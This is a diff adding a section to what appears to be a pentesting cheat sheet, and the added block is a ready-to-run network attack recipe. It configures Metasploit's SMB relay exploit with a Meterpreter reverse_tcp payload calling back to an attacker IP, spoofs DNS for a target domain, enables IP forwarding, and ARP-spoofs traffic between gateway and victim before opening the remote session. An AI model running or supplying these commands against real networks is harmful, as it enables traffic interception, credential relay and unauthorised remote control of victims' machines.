@@ -390,6 +390,33 @@ run
 ```
 ---
 
+### SMB Relay Attack with DNS Spoofing, ARP Spoofing, and Meterpreter Session
+    ```bash
+    # 1. Launch Metasploit and configure SMB relay
+    msfconsole
+    use exploit/windows/smb/smb_relay
+    set SRVHOST <attacker_ip>
+    set LHOST <attacker_ip>
+    set PAYLOAD windows/meterpreter/reverse_tcp
+    set SMBHOST <target_ip>
+    exploit
+    
+    # 2. Spoof DNS response for wildcard domain to point to attacker
+    echo "<attacker_ip> *.targetdomain.com" > dns
+    dnsspoof -i <iface> -f dns
+    
+    # 3. Enable IP forwarding
+    echo 1 > /proc/sys/net/ipv4/ip_forward
+    
+    # 4. Run ARP spoofing between gateway and target
+    arpspoof -i <iface> -t <target_ip> <gateway_ip>
+    arpspoof -i <iface> -t <gateway_ip> <target_ip>
+    
+    # 5. Interact with the Meterpreter session once triggered
+    sessions
+    sessions -i 1
+    getuid
+    ```
 
 ###  Privilege Escalation via Writable Script + `sudo` Misconfiguration
 
